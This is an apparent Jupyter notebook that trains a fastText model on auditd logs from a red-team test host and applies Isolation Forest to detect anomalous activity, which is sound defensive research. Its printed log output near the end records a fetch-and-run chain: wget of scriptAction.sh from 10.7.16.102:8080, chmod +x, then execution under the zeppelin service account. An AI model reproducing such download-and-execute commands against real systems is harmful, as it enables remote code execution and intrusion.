# %%
import fasttext
import os
import numpy as np
import sys
sys.path.append("../../")
from utils.preprocessing import auditdPreprocessTable, auditdReadAndFilterFile

# %%
help(fasttext)
# Out:
# Help on package fasttext:
#
# NAME
#     fasttext
#
# DESCRIPTION
#     # Copyright (c) 2017-present, Facebook, Inc.
#     # All rights reserved.
#     #
#     # This source code is licensed under the MIT license found in the
#     # LICENSE file in the root directory of this source tree.
#
# PACKAGE CONTENTS
#     FastText
#     tests (package)
#     util (package)
#
# DATA
#     BOW = '<'
#     EOS = '</s>'
#     EOW = '>'
#     absolute_import = _Feature((2, 5, 0, 'alpha', 1), (3, 0, 0, 'alpha', 0...
#     division = _Feature((2, 2, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0), 1310...
#     print_function = _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0)...
#     unicode_literals = _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', ...
#
# FILE
#     c:\users\dtrizna\appdata\local\packages\pythonsoftwarefoundation.python.3.9_qbz5n2kfra8p0\localcache\local-packages\python39\site-packages\fasttext\__init__.py
#
#
# None

# %%
dir(fasttext)
# Out:
# ['BOW',
#  'EOS',
#  'EOW',
#  'FastText',
#  '__builtins__',
#  '__cached__',
#  '__doc__',
#  '__file__',
#  '__loader__',
#  '__name__',
#  '__package__',
#  '__path__',
#  '__spec__',
#  'absolute_import',
#  'cbow',
#  'division',
#  'load_model',
#  'print_function',
#  'skipgram',
#  'supervised',
#  'tokenize',
#  'train_supervised',
#  'train_unsupervised',
#  'unicode_literals']

# %%
help(fasttext.FastText)
# Out:
# Help on module fasttext.FastText in fasttext:
#
# NAME
#     fasttext.FastText
#
# DESCRIPTION
#     # Copyright (c) 2017-present, Facebook, Inc.
#     # All rights reserved.
#     #
#     # This source code is licensed under the MIT license found in the
#     # LICENSE file in the root directory of this source tree.
#
# FUNCTIONS
#     cbow(*kargs, **kwargs)
#
#     eprint(*args, **kwargs)
#
#     load_model(path)
#         Load a model given a filepath and return a model object.
#
#     read_args(arg_list, arg_dict, arg_names, default_values)
#
#     skipgram(*kargs, **kwargs)
#
#     supervised(*kargs, **kwargs)
#
#     tokenize(text)
#         Given a string of text, tokenize it and return a list of tokens
#
#     train_supervised(*kargs, **kwargs)
#         Train a supervised model and return a model object.
#
#         input must be a filepath. The input text does not need to be tokenized
#         as per the tokenize function, but it must be preprocessed and encoded
#         as UTF-8. You might want to consult standard preprocessing scripts such
#         as tokenizer.perl mentioned here: http://www.statmt.org/wmt07/baseline.html
#
#         The input file must must contain at least one label per line. For an
#         example consult the example datasets which are part of the fastText
#         repository such as the dataset pulled by classification-example.sh.
#
#     train_unsupervised(*kargs, **kwargs)
#         Train an unsupervised model and return a model object.
#
#         input must be a filepath. The input text does not need to be tokenized
#         as per the tokenize function, but it must be preprocessed and encoded
#         as UTF-8. You might want to consult standard preprocessing scripts such
#         as tokenizer.perl mentioned here: http://www.statmt.org/wmt07/baseline.html
#
#         The input field must not contain any labels or use the specified label prefix
#         unless it is ok for those words to be ignored. For an example consult the
#         dataset pulled by the example script word-vector-example.sh, which is
#         part of the fastText repository.
#
# DATA
#     BOW = '<'
#     EOS = '</s>'
#     EOW = '>'
#     absolute_import = _Feature((2, 5, 0, 'alpha', 1), (3, 0, 0, 'alpha', 0...
#     displayed_errors = {}
#     division = _Feature((2, 2, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0), 1310...
#     print_function = _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', 0)...
#     unicode_literals = _Feature((2, 6, 0, 'alpha', 2), (3, 0, 0, 'alpha', ...
#     unsupervised_default = {'autotuneDuration': 300, 'autotuneMetric': 'f1...
#
# FILE
#     c:\users\dtrizna\appdata\local\packages\pythonsoftwarefoundation.python.3.9_qbz5n2kfra8p0\localcache\local-packages\python39\site-packages\fasttext\fasttext.py

# %% [markdown]
# ```
# train_unsupervised() parameters
#     input             # training file path (required)
#     model             # unsupervised fasttext model {cbow, skipgram} [skipgram]
#     lr                # learning rate [0.05]
#     dim               # size of word vectors [100]
#     ws                # size of the context window [5]
#     epoch             # number of epochs [5]
#     minCount          # minimal number of word occurences [5]
#     minn              # min length of char ngram [3]
#     maxn              # max length of char ngram [6]
#     neg               # number of negatives sampled [5]
#     wordNgrams        # max length of word ngram [1]
#     loss              # loss function {ns, hs, softmax, ova} [ns]
#     bucket            # number of buckets [2000000]
#     thread            # number of threads [number of cpus]
#     lrUpdateRate      # change the rate of updates for the learning rate [100]
#     t                 # sampling threshold [0.0001]
#     verbose           # verbose [2]
# ```

# %%
EPOCHS = 5 
model = fasttext.train_unsupervised(input='auditd_parsed.out', 
                                    model='cbow',
                                    dim=100,
                                    epoch=EPOCHS
                                  )
modelName = f'../../models/FastText_auditd_epoch{EPOCHS}_dim100.model'
model.save_model(modelName)

# %% [markdown]
# #### Training time
#
# 1 epoch over my data (~58k lines, no line limit) took ~10 min on my PC.
# 5 epochs with (~63k lines, max line limit 20k) took 16 min on my PC.
#
# #### Model methods
#
# ```
# model['king']       # equivalent to model.get_word_vector('king')
# 'king' in model     # equivalent to `'king' in model.get_words()`
# ```
#
# The properties words, labels return the words and labels from the dictionary :
#
# ```
# model.words         # equivalent to model.get_words()
# model.labels        # equivalent to model.get_labels()
# ```
#
#
# Acquire representations:
#
# ```
# get_output_matrix       # Get a copy of the full output matrix of a Model.
# get_sentence_vector     # Given a string, get a single vector represenation. This function
#                         # assumes to be given a single line of text. We split words on
#                         # whitespace (space, newline, tab, vertical tab) and the control
#                         # characters carriage return, formfeed and the null character.
# get_word_vector         # Get the vector representation of word.
# ```

# %% [markdown]
# ## Testing on red team host
#
# #### Playing with model methods

# %%
testpath = r"C:\Users\dtrizna\Code\ReverseShellModel\data\auditd_redTeam_Vanquish\hn0-mcvq-h.mcvq-hdi-1\\"
testfile = os.listdir(testpath)[0]

df = auditdReadAndFilterFile(testpath + testfile)
# TBD: CHUNK 15 mins to 5 mins
out = auditdPreprocessTable(df)
len(out)
# Out:
# 1

# %%
model.get_sentence_vector(out[0].strip())
# Out:
# array([ 0.11351786, -0.06382863, -0.19818021,  0.03554732,  0.09726189,
#        -0.06203981,  0.05057658,  0.03787687, -0.04816632,  0.02065927,
#        -0.03649987, -0.04019757, -0.01962271,  0.00692323, -0.04398575,
#        -0.08829232,  0.00898177, -0.01889625, -0.03264821,  0.03516597,
#         0.02019144, -0.04952623,  0.12412089,  0.01759106, -0.04816433,
#        -0.09281942,  0.11193811,  0.03240861,  0.10942467,  0.04808146,
#         0.10768707, -0.04701773,  0.03540739, -0.03427002, -0.03667444,
#        -0.08510783,  0.06590588, -0.0249194 ,  0.04070363, -0.0384384 ,
#         0.0774637 , -0.08683956, -0.09954648, -0.03973066, -0.0579142 ,
#         0.01767174, -0.01009628,  0.01804248, -0.1395423 , -0.08071586,
#         0.07230647,  0.06940354, -0.02851207, -0.02380361, -0.00393891,
#         0.12259109, -0.01588425,  0.17238998,  0.04413609, -0.03554948,
#        -0.07714374, -0.13945404,  0.05660862,  0.12678856,  0.05176254,
#        -0.02040313,  0.02712875,  0.09667739, -0.01560235, -0.03783931,
#        -0.01165465, -0.08265109,  0.05621555, -0.01881425, -0.09749907,
#        -0.04030425,  0.00644031,  0.02869256,  0.01445157,  0.10767418,
#        -0.02701486, -0.01778861,  0.04151445, -0.05454651, -0.01799307,
#         0.08866447, -0.03259304, -0.00435598, -0.07860272,  0.01950786,
#         0.04104647,  0.03459316, -0.02635491,  0.07199686,  0.0588665 ,
#         0.00850696,  0.12259331, -0.00160386, -0.05733865,  0.14812505],
#       dtype=float32)

# %%
model.get_output_matrix().shape
# Out:
# (58376, 100)

# %%
print(model.get_word_vector('execution').shape)
model.get_word_vector('execution')
# Out:
# (100,)
# array([ 2.814944  , -1.4055046 , -3.2967927 ,  1.7034147 ,  2.8427227 ,
#        -1.9628539 ,  1.6635273 ,  3.453258  , -0.23760906,  1.1232091 ,
#        -0.14625952, -1.081543  ,  1.3631423 ,  0.6750327 ,  0.44764438,
#        -2.1185277 ,  0.36523306,  0.9787951 , -0.6800164 ,  0.8633673 ,
#         0.6136547 , -3.5508103 ,  1.6225142 , -0.3692602 , -0.03943949,
#        -0.09198474,  2.4122396 ,  0.3186247 ,  2.623519  , -2.3248742 ,
#         4.663666  , -3.0369852 ,  0.02233928, -0.8739949 ,  0.00992498,
#         0.14866081,  3.392979  ,  0.5169353 , -0.45233417, -2.3596864 ,
#         1.942922  , -1.848101  , -3.5660589 , -2.3548243 , -0.8612346 ,
#        -0.32178608,  1.3452852 , -0.00746955, -1.402314  , -1.2862695 ,
#         2.2786183 ,  0.51172924, -0.8119596 ,  0.58224356, -0.80307233,
#         3.4775472 , -0.8387652 ,  2.7092254 ,  0.76924944, -1.3355405 ,
#        -2.0309412 , -2.6181257 , -0.6359899 ,  1.8521314 ,  1.2780528 ,
#         1.0930306 , -2.8571076 ,  2.3287842 ,  0.6596986 , -0.6021662 ,
#         0.05989644, -2.7473447 , -0.14176087,  0.2743003 , -1.9225929 ,
#        -0.87940645,  0.5612709 , -1.2212756 ,  0.63309455,  3.2385366 ,
#         1.5714324 ,  1.1268568 ,  2.1724548 ,  0.7851633 ,  1.2728813 ,
#         0.7979208 , -2.1101377 ,  0.6234476 , -1.9765804 , -0.16607806,
#        -0.19490883, -0.82368165,  1.7676301 , -0.6047718 ,  1.4449531 ,
#        -1.0270958 ,  2.6570222 , -0.9167286 ,  0.61093545,  2.413541  ],
#       dtype=float32)

# %%
fasttext.tokenize(out[0])[0:10]
# Out:
# ['execution',
#  ',',
#  'execve',
#  ',',
#  'unset',
#  ',',
#  'root',
#  ',',
#  '/sbin/iptables',
#  ',']

# %% [markdown]
# #### Anomaly detection?

# %%
EPOCHS = 5 
model = fasttext.train_unsupervised(input='auditd_parsed.out', 
                                    model='cbow',
                                    dim=100,
                                    epoch=EPOCHS
                                  )
modelName = f'../../models/FastText_auditd_epoch{EPOCHS}_dim100.model'
model.save_model(modelName)

# %%
import fasttext
import numpy as np

import os
import sys
sys.path.append("../../")
from utils.preprocessing import auditdPreprocessTable, auditdReadAndFilterFile

def splitDataFrameTimeStampToChunks(df, chunkSize='5min'):
    import pandas as pd
    df['TimeStamp'] = pd.to_datetime(df['TimeStamp'])
    df['TimeStamp'] = df['TimeStamp'].dt.floor(chunkSize)
    return df

testpath = r"C:\Users\dtrizna\Code\ReverseShellModel\data\auditd_redTeam_Vanquish\hn0-mcvq-h.mcvq-hdi-1\\"
files = os.listdir(testpath)

model = fasttext.load_model(modelName)

arr = np.empty((0,100)) # 100 -- fasttext dim
arrRaw = []
dfList = []
for i, testfile in enumerate(files):
    df = auditdReadAndFilterFile(testpath + testfile)
    if df.empty:
        continue

    # ground timestamps to 5 min intervals
    df = splitDataFrameTimeStampToChunks(df.copy(), chunkSize="5min")
    
    # get grounded timestamps
    chunks = df.TimeStamp.unique()

    # parse each interval separately
    for chunk in chunks:
        newdf = df[df.TimeStamp == chunk].copy()
        auditdHostActivities = auditdPreprocessTable(newdf)
        
        for hostActivity in auditdHostActivities:
            hostRepresentation = model.get_sentence_vector(hostActivity.replace('\n', ''))
            # save stats
            arrRaw.append(hostActivity)
            dfList.append(newdf)
            arr = np.vstack((arr, hostRepresentation))

    print(f"{i+1}/{len(files)} File: {testfile}; Chunks: {len(chunks)}; Array: {arr.shape}")
# Out:
# Warning : `load_model` does not return WordVectorModel or SupervisedModel any more, but a `FastText` object which is very similar.
# 1/144 File: 2022-10-03--12_00.json; Chunks: 3; Array: (3, 100)
# 2/144 File: 2022-10-03--12_15.json; Chunks: 3; Array: (6, 100)
# 3/144 File: 2022-10-03--12_30.json; Chunks: 3; Array: (9, 100)
# 4/144 File: 2022-10-03--12_45.json; Chunks: 3; Array: (12, 100)
# 5/144 File: 2022-10-03--13_00.json; Chunks: 3; Array: (15, 100)
# 6/144 File: 2022-10-03--13_15.json; Chunks: 3; Array: (18, 100)
# 7/144 File: 2022-10-03--13_30.json; Chunks: 3; Array: (21, 100)
# 8/144 File: 2022-10-03--13_45.json; Chunks: 3; Array: (24, 100)
# 9/144 File: 2022-10-03--14_00.json; Chunks: 3; Array: (27, 100)
# 10/144 File: 2022-10-03--14_15.json; Chunks: 3; Array: (30, 100)
# 11/144 File: 2022-10-03--14_30.json; Chunks: 3; Array: (33, 100)
# 12/144 File: 2022-10-03--14_45.json; Chunks: 3; Array: (36, 100)
# 13/144 File: 2022-10-03--15_00.json; Chunks: 3; Array: (39, 100)
# 14/144 File: 2022-10-03--15_15.json; Chunks: 3; Array: (42, 100)
# 15/144 File: 2022-10-03--15_30.json; Chunks: 3; Array: (45, 100)
# 16/144 File: 2022-10-03--15_45.json; Chunks: 3; Array: (48, 100)
# 17/144 File: 2022-10-03--16_00.json; Chunks: 3; Array: (51, 100)
# 18/144 File: 2022-10-03--16_15.json; Chunks: 3; Array: (54, 100)
# 19/144 File: 2022-10-03--16_30.json; Chunks: 3; Array: (57, 100)
# 20/144 File: 2022-10-03--16_45.json; Chunks: 3; Array: (60, 100)
# 21/144 File: 2022-10-03--17_00.json; Chunks: 3; Array: (63, 100)
# 22/144 File: 2022-10-03--17_15.json; Chunks: 3; Array: (66, 100)
# 23/144 File: 2022-10-03--17_30.json; Chunks: 3; Array: (69, 100)
# 24/144 File: 2022-10-03--17_45.json; Chunks: 3; Array: (72, 100)
# 25/144 File: 2022-10-03--18_00.json; Chunks: 3; Array: (75, 100)
# 26/144 File: 2022-10-03--18_15.json; Chunks: 3; Array: (78, 100)
# 27/144 File: 2022-10-03--18_30.json; Chunks: 3; Array: (81, 100)
# 28/144 File: 2022-10-03--18_45.json; Chunks: 3; Array: (84, 100)
# 29/144 File: 2022-10-03--19_00.json; Chunks: 3; Array: (87, 100)
# 30/144 File: 2022-10-03--19_15.json; Chunks: 3; Array: (90, 100)
# 31/144 File: 2022-10-03--19_30.json; Chunks: 3; Array: (93, 100)
# 32/144 File: 2022-10-03--19_45.json; Chunks: 3; Array: (96, 100)
# 33/144 File: 2022-10-03--20_00.json; Chunks: 3; Array: (99, 100)
# 34/144 File: 2022-10-03--20_15.json; Chunks: 3; Array: (102, 100)
# 35/144 File: 2022-10-03--20_30.json; Chunks: 3; Array: (105, 100)
# 36/144 File: 2022-10-03--20_45.json; Chunks: 3; Array: (108, 100)
# 37/144 File: 2022-10-03--21_00.json; Chunks: 3; Array: (111, 100)
# 38/144 File: 2022-10-03--21_15.json; Chunks: 3; Array: (114, 100)
# 39/144 File: 2022-10-03--21_30.json; Chunks: 3; Array: (117, 100)
# 40/144 File: 2022-10-03--21_45.json; Chunks: 3; Array: (120, 100)
# 41/144 File: 2022-10-03--22_00.json; Chunks: 3; Array: (123, 100)
# 42/144 File: 2022-10-03--22_15.json; Chunks: 3; Array: (126, 100)
# 43/144 File: 2022-10-03--22_30.json; Chunks: 3; Array: (129, 100)
# 44/144 File: 2022-10-03--22_45.json; Chunks: 3; Array: (132, 100)
# 45/144 File: 2022-10-03--23_00.json; Chunks: 3; Array: (135, 100)
# 46/144 File: 2022-10-03--23_15.json; Chunks: 3; Array: (138, 100)
# 47/144 File: 2022-10-03--23_30.json; Chunks: 3; Array: (141, 100)
# 48/144 File: 2022-10-03--23_45.json; Chunks: 3; Array: (144, 100)
# 49/144 File: 2022-10-04--00_00.json; Chunks: 3; Array: (147, 100)
# 50/144 File: 2022-10-04--00_15.json; Chunks: 3; Array: (150, 100)
# 51/144 File: 2022-10-04--00_30.json; Chunks: 3; Array: (153, 100)
# 52/144 File: 2022-10-04--00_45.json; Chunks: 3; Array: (156, 100)
# 53/144 File: 2022-10-04--01_00.json; Chunks: 3; Array: (159, 100)
# 54/144 File: 2022-10-04--01_15.json; Chunks: 3; Array: (162, 100)
# 55/144 File: 2022-10-04--01_30.json; Chunks: 3; Array: (165, 100)
# 56/144 File: 2022-10-04--01_45.json; Chunks: 3; Array: (168, 100)
# 57/144 File: 2022-10-04--02_00.json; Chunks: 3; Array: (171, 100)
# 58/144 File: 2022-10-04--02_15.json; Chunks: 3; Array: (174, 100)
# 59/144 File: 2022-10-04--02_30.json; Chunks: 3; Array: (177, 100)
# 60/144 File: 2022-10-04--02_45.json; Chunks: 3; Array: (180, 100)
# 61/144 File: 2022-10-04--03_00.json; Chunks: 3; Array: (183, 100)
# 62/144 File: 2022-10-04--03_15.json; Chunks: 3; Array: (186, 100)
# 63/144 File: 2022-10-04--03_30.json; Chunks: 3; Array: (189, 100)
# 64/144 File: 2022-10-04--03_45.json; Chunks: 3; Array: (192, 100)
# 65/144 File: 2022-10-04--04_00.json; Chunks: 3; Array: (195, 100)
# 66/144 File: 2022-10-04--04_15.json; Chunks: 3; Array: (198, 100)
# 67/144 File: 2022-10-04--04_30.json; Chunks: 3; Array: (201, 100)
# 68/144 File: 2022-10-04--04_45.json; Chunks: 3; Array: (204, 100)
# 69/144 File: 2022-10-04--05_00.json; Chunks: 3; Array: (207, 100)
# 70/144 File: 2022-10-04--05_15.json; Chunks: 3; Array: (210, 100)
# 71/144 File: 2022-10-04--05_30.json; Chunks: 3; Array: (213, 100)
# 72/144 File: 2022-10-04--05_45.json; Chunks: 3; Array: (216, 100)
# 73/144 File: 2022-10-04--06_00.json; Chunks: 3; Array: (219, 100)
# 74/144 File: 2022-10-04--06_15.json; Chunks: 3; Array: (222, 100)
# 75/144 File: 2022-10-04--06_30.json; Chunks: 3; Array: (225, 100)
# 76/144 File: 2022-10-04--06_45.json; Chunks: 3; Array: (228, 100)
# 77/144 File: 2022-10-04--07_00.json; Chunks: 3; Array: (231, 100)
# 78/144 File: 2022-10-04--07_15.json; Chunks: 3; Array: (234, 100)
# 79/144 File: 2022-10-04--07_30.json; Chunks: 3; Array: (237, 100)
# 80/144 File: 2022-10-04--07_45.json; Chunks: 3; Array: (240, 100)
# 81/144 File: 2022-10-04--08_00.json; Chunks: 3; Array: (243, 100)
# 82/144 File: 2022-10-04--08_15.json; Chunks: 3; Array: (246, 100)
# 83/144 File: 2022-10-04--08_30.json; Chunks: 3; Array: (249, 100)
# 84/144 File: 2022-10-04--08_45.json; Chunks: 3; Array: (252, 100)
# 85/144 File: 2022-10-04--09_00.json; Chunks: 3; Array: (255, 100)
# 86/144 File: 2022-10-04--09_15.json; Chunks: 3; Array: (258, 100)
# 87/144 File: 2022-10-04--09_30.json; Chunks: 3; Array: (261, 100)
# 88/144 File: 2022-10-04--09_45.json; Chunks: 3; Array: (264, 100)
# 89/144 File: 2022-10-04--10_00.json; Chunks: 3; Array: (267, 100)
# 90/144 File: 2022-10-04--10_15.json; Chunks: 3; Array: (270, 100)
# 91/144 File: 2022-10-04--10_30.json; Chunks: 3; Array: (273, 100)
# 92/144 File: 2022-10-04--10_45.json; Chunks: 3; Array: (276, 100)
# 93/144 File: 2022-10-04--11_00.json; Chunks: 3; Array: (279, 100)
# 94/144 File: 2022-10-04--11_15.json; Chunks: 3; Array: (282, 100)
# 95/144 File: 2022-10-04--11_30.json; Chunks: 3; Array: (285, 100)
# 96/144 File: 2022-10-04--11_45.json; Chunks: 3; Array: (288, 100)
# 97/144 File: 2022-10-04--12_00.json; Chunks: 3; Array: (291, 100)
# 98/144 File: 2022-10-04--12_15.json; Chunks: 3; Array: (294, 100)
# 99/144 File: 2022-10-04--12_30.json; Chunks: 4; Array: (298, 100)
# 100/144 File: 2022-10-04--12_45.json; Chunks: 3; Array: (301, 100)
# 101/144 File: 2022-10-04--13_00.json; Chunks: 3; Array: (304, 100)
# 102/144 File: 2022-10-04--13_15.json; Chunks: 3; Array: (307, 100)
# 103/144 File: 2022-10-04--13_30.json; Chunks: 3; Array: (310, 100)
# 104/144 File: 2022-10-04--13_45.json; Chunks: 3; Array: (313, 100)
# 105/144 File: 2022-10-04--14_00.json; Chunks: 3; Array: (316, 100)
# 106/144 File: 2022-10-04--14_15.json; Chunks: 3; Array: (319, 100)
# 107/144 File: 2022-10-04--14_30.json; Chunks: 3; Array: (322, 100)
# 108/144 File: 2022-10-04--14_45.json; Chunks: 3; Array: (325, 100)
# 109/144 File: 2022-10-04--15_00.json; Chunks: 3; Array: (328, 100)
# 110/144 File: 2022-10-04--15_15.json; Chunks: 3; Array: (331, 100)
# 111/144 File: 2022-10-04--15_30.json; Chunks: 3; Array: (334, 100)
# 112/144 File: 2022-10-04--15_45.json; Chunks: 3; Array: (337, 100)
# 113/144 File: 2022-10-04--16_00.json; Chunks: 3; Array: (340, 100)
# 114/144 File: 2022-10-04--16_15.json; Chunks: 3; Array: (343, 100)
# 115/144 File: 2022-10-04--16_30.json; Chunks: 3; Array: (346, 100)
# 116/144 File: 2022-10-04--16_45.json; Chunks: 3; Array: (349, 100)
# 117/144 File: 2022-10-04--17_00.json; Chunks: 3; Array: (352, 100)
# 118/144 File: 2022-10-04--17_15.json; Chunks: 3; Array: (355, 100)
# 119/144 File: 2022-10-04--17_30.json; Chunks: 3; Array: (358, 100)
# 120/144 File: 2022-10-04--17_45.json; Chunks: 3; Array: (361, 100)
# 121/144 File: 2022-10-04--18_00.json; Chunks: 3; Array: (364, 100)
# 122/144 File: 2022-10-04--18_15.json; Chunks: 3; Array: (367, 100)
# 123/144 File: 2022-10-04--18_30.json; Chunks: 3; Array: (370, 100)
# 124/144 File: 2022-10-04--18_45.json; Chunks: 3; Array: (373, 100)
# 125/144 File: 2022-10-04--19_00.json; Chunks: 3; Array: (376, 100)
# 126/144 File: 2022-10-04--19_15.json; Chunks: 3; Array: (379, 100)
# 127/144 File: 2022-10-04--19_30.json; Chunks: 3; Array: (382, 100)
# 128/144 File: 2022-10-04--19_45.json; Chunks: 3; Array: (385, 100)
# 129/144 File: 2022-10-04--20_00.json; Chunks: 3; Array: (388, 100)
# 130/144 File: 2022-10-04--20_15.json; Chunks: 3; Array: (391, 100)
# 131/144 File: 2022-10-04--20_30.json; Chunks: 3; Array: (394, 100)
# 132/144 File: 2022-10-04--20_45.json; Chunks: 3; Array: (397, 100)
# 133/144 File: 2022-10-04--21_00.json; Chunks: 3; Array: (400, 100)
# 134/144 File: 2022-10-04--21_15.json; Chunks: 3; Array: (403, 100)
# 135/144 File: 2022-10-04--21_30.json; Chunks: 3; Array: (406, 100)
# 136/144 File: 2022-10-04--21_45.json; Chunks: 3; Array: (409, 100)
# 137/144 File: 2022-10-04--22_00.json; Chunks: 3; Array: (412, 100)
# 138/144 File: 2022-10-04--22_15.json; Chunks: 3; Array: (415, 100)
# 139/144 File: 2022-10-04--22_30.json; Chunks: 3; Array: (418, 100)
# 140/144 File: 2022-10-04--22_45.json; Chunks: 3; Array: (421, 100)
# 141/144 File: 2022-10-04--23_00.json; Chunks: 3; Array: (424, 100)
# 142/144 File: 2022-10-04--23_15.json; Chunks: 3; Array: (427, 100)
# 143/144 File: 2022-10-04--23_30.json; Chunks: 3; Array: (430, 100)
# File: C:\Users\dtrizna\Code\ReverseShellModel\data\auditd_redTeam_Vanquish\hn0-mcvq-h.mcvq-hdi-1\\out.log -- JSONDecodeError:
# 	 unexpected character: line 1 column 2 (char 1)

# %%
print(len(arrRaw))
arr.shape
# Out:
# 430
# (430, 100)

# %%
def isolationForestAnomalyDetctions(arr):
    from sklearn.ensemble import IsolationForest
    clf = IsolationForest(max_samples=100, random_state=42)
    clf.fit(arr)
    return clf.predict(arr)

def plot3D(arr, labels, title):
    import matplotlib.pyplot as plt
    from mpl_toolkits.mplot3d import Axes3D
    fig = plt.figure(figsize=(16,10))
    ax = fig.add_subplot(111, projection='3d')
    ax.scatter(arr[:,0], arr[:,1], arr[:,2], c=labels)
    plt.title(title)
    plt.show()

def tSneReductionTo3D(arr):
    from sklearn.manifold import TSNE
    tsne = TSNE(n_components=3, verbose=1, perplexity=40, n_iter=300)
    tsne_results = tsne.fit_transform(arr)
    return tsne_results

# %%
labels = isolationForestAnomalyDetctions(arr)
arrnew = tSneReductionTo3D(arr)
plot3D(arrnew, labels, "Isolation Forest")
# Out:
# C:\Users\dtrizna\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.9_qbz5n2kfra8p0\LocalCache\local-packages\Python39\site-packages\sklearn\manifold\_t_sne.py:795: FutureWarning: The default initialization in TSNE will change from 'random' to 'pca' in 1.2.
#   warnings.warn(
# C:\Users\dtrizna\AppData\Local\Packages\PythonSoftwareFoundation.Python.3.9_qbz5n2kfra8p0\LocalCache\local-packages\Python39\site-packages\sklearn\manifold\_t_sne.py:805: FutureWarning: The default learning rate in TSNE will change from 200.0 to 'auto' in 1.2.
#   warnings.warn(
# [t-SNE] Computing 121 nearest neighbors...
# [t-SNE] Indexed 430 samples in 0.001s...
# [t-SNE] Computed neighbors for 430 samples in 0.181s...
# [t-SNE] Computed conditional probabilities for sample 430 / 430
# [t-SNE] Mean sigma: 0.018993
# [t-SNE] KL divergence after 250 iterations with early exaggeration: 104.711502
# [t-SNE] KL divergence after 300 iterations: 2.649108

# %% [markdown]
# ### This is actually better according to brief look below!
#
# Might be Isolation Forest finds hard time to find anomlies in 100 dimensions.

# %%
labelsCheat = isolationForestAnomalyDetctions(arrnew)
plot3D(arrnew, labelsCheat, "Isolation Forest w/ t-SNE cheat")

# %%
print((labels != 1).sum()) # before t-SNE dim reduction
(labelsCheat != 1).sum() # after
# Out:
# 69
# 47

# %%
import pandas as pd
totalDF = pd.concat(arrRaw)['process.title']
totalDF.str.contains('scriptAction').sum()
# Out:
# 11

# %%
anomalousActivities = [arrRaw[x] for x in np.where(labels != 1)[0]]
anomalousDF = pd.concat(anomalousActivities)
print(anomalousDF['process.title'].str.contains('scriptAction').sum())
print(anomalousDF['process.title'].str.contains('wget').sum())
# Out:
# 0
# 14

# %%
anomalousDF[anomalousDF['process.title'].str.contains('wget')]['process.title'].unique()
# Out:
# array(['wget --timeout 60 -U wget/1.19.4-1ubuntu2.2 Ubuntu/18.04.6/LTS GNU/Linux/5.4.0-1064-azure/x86_64 Intel(R)/Xeon(R)/CPU/E5-2673/v3/@/2.40GHz cloud_id/azure -O- --content-on-error https://motd.ubuntu.com',
#        'wget --timeout 60 -U wget/1.19.4-1ubuntu2.2 Ubuntu/18.04.6/LTS GNU/Linux/5.4.0-1064-azure/x86_64 Intel(R)/Xeon(R)/CPU/E5-2673/v3',
#        'dpkg -l wget', 'dpkg-query --list -- wget'], dtype=object)

# %%
import pandas as pd
anomalousActivities = [arrRaw[x] for x in np.where(labelsCheat != 1)[0]]
anomalousDF = pd.concat(anomalousActivities)
print(anomalousDF['process.title'].str.contains('scriptAction').sum())
print(anomalousDF['process.title'].str.contains('wget').sum())
# Out:
# 7
# 2

# %%
anomalousDF[anomalousDF['process.title'].str.contains('scriptAction')]
# Out:
#      rule.sidid    hostname auditd.data.syscall auditd.summary.actor.primary  \
# 5723  execution  hn0-mcvq-h              execve                        unset
# 5724  execution  hn0-mcvq-h              execve                        unset
# 9157  execution  hn0-mcvq-h              execve                        unset
# 9126  execution  hn0-mcvq-h              execve                        unset
# 9127  execution  hn0-mcvq-h              execve                        unset
# 9672  execution  hn0-mcvq-h              execve                        unset
# 9673  execution  hn0-mcvq-h              execve                        unset
#
#      auditd.summary.actor.secondary auditd.summary.object.primary  \
# 5723                       zeppelin                     /bin/bash
# 5724                       zeppelin                      /bin/cat
# 9157                       zeppelin                     /bin/bash
# 9126                       zeppelin                     /bin/bash
# 9127                       zeppelin                    /bin/chmod
# 9672                       zeppelin                     /bin/bash
# 9673                       zeppelin                 /usr/bin/wget
#
#      auditd.summary.object.secondary  \
# 5723                          (none)
# 5724                          (none)
# 9157                          (none)
# 9126                          (none)
# 9127                          (none)
# 9672                          (none)
# 9673                          (none)
#
#                                           process.title  \
# 5723                        bash -c cat scriptAction.sh
# 5724                                cat scriptAction.sh
# 9157                          bash -c ./scriptAction.sh
# 9126                   bash -c chmod +x scriptAction.sh
# 9127                           chmod +x scriptAction.sh
# 9672  bash -c wget http://10.7.16.102:8080/scriptAct...
# 9673       wget http://10.7.16.102:8080/scriptAction.sh
#
#      process.working_directory process.ppid  \
# 5723         /var/lib/zeppelin        (pid)
# 5724         /var/lib/zeppelin        (pid)
# 9157         /var/lib/zeppelin        (pid)
# 9126         /var/lib/zeppelin        (pid)
# 9127         /var/lib/zeppelin        (pid)
# 9672         /var/lib/zeppelin        (pid)
# 9673         /var/lib/zeppelin        (pid)
#
#              process.parent.process.executable  \
# 5723  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 5724  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 9157  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 9126  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 9127  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 9672  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
# 9673  /usr/lib/jvm/zulu-8-azure-amd64/bin/java
#
#                            process.parent.process.title event.separator
# 5723  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...           (sep)
# 5724  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...           (sep)
# 9157  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...           (sep)
# 9126  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...           (sep)
# 9127  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...           (sep)
# 9672  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...           (sep)
# 9673  /usr/lib/jvm/zulu-8-azure-amd64/bin/java -Dfil...           (sep)

# %% [markdown]
# ### Noted that some events had suspicious acitivty in `process.args`, but not in `process.title`.
#
# For all events that has `process.args`, will place `args` to `title`.

# %%
cols = ['process.title', 'process.args']
df[df['process.args'].str.contains('scriptAct', na=False)][cols]
# Out:
#                                           process.title  \
